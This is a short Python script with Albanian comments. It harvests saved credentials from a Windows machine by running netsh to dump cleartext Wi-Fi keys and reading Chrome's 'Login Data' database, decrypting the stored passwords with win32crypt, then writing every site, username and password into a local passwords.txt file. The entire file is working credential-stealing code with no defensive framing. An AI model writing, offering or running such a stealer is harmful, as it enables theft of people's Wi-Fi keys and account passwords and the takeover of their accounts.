import subprocess
import os,sqlite3,win32crypt

b=open("passwords.txt","w") #shkruajme nje fajll ku do te ruhen te gjithe fjalekalimet
try:
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
 profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
 b.write("Fjalekalimet e WiFi-ve :\n")
 for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    wifi = (i,results)
    b.write(str(wifi))
    b.write("\n"+" == ==="*10+"\n")
except:
    b.write("Nuk u gjet asnje fjalekalim i wireless \n")

try:
 b.write("\n\n\n")
 data=os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
 connection = sqlite3.connect(data)
 cursor = connection.cursor()
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 final_data=cursor.fetchall()
 b.write("Fjalekalimet e ruajtura ne Chrome :\n")
 for website_data in final_data:
    password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
    one="Faqja  : "+str(website_data[0])
    two="Username : "+str(website_data[1])
    three="Password : "+str(password)
    b.write(one+"\n"+two+"\n"+three)
    b.write("\n"+" == ==="*10+"\n")
except:
    b.write("Nuk u gjet asnje fjalekalim nga Google Chrome \n")
